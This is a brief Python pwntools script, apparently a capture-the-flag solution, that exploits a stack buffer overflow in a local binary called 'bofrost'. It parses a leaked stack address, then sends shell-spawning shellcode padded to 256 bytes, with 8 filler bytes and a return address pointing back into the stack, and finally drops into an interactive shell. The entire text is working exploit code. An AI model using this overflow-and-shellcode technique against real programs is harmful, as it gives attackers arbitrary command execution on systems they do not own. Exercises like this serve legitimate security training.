from pwn import *

context.binary = exe = ELF("./bofrost")

r = process("./bofrost")

r.recvuntil(b"RSP = ")
stack_leak = int(r.recvline().strip().decode(), 16)

r.sendline(asm(shellcraft.sh()).ljust(256, b"A") + 8 * b"B" + p64(stack_leak + 0x10))
r.interactive()
